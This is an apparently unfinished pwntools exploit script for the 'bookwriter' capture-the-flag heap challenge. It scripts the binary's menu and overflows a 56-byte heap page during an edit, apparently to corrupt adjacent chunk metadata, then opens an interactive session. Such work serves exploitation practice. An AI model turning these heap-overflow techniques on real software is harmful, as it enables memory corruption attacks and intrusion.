from pwn import *

context.log_level = 'debug'

def add(size, content):
    global p
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(content)

def view(index):
    global p
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(index))

def edit(index, content):
    global p
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)

def information(changeAuthor=False, authorName=None):
    global p
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('(yes:1 / no:0)')
    if changeAuthor:
        p.sendline('1')
        p.recvuntil('Author :')
        p.sendline(authorName)
    else:
        p.sendline('0')

authorName = "ngoctin"
p = process('./bookwriter')
p.recvuntil('Author :')
p.sendline(authorName)

size = 56
add(size, '0'*size)
edit(0, '1'*size)
edit(0, '2'*size + '3'*10)
view(0)
p.recv()
p.interactive()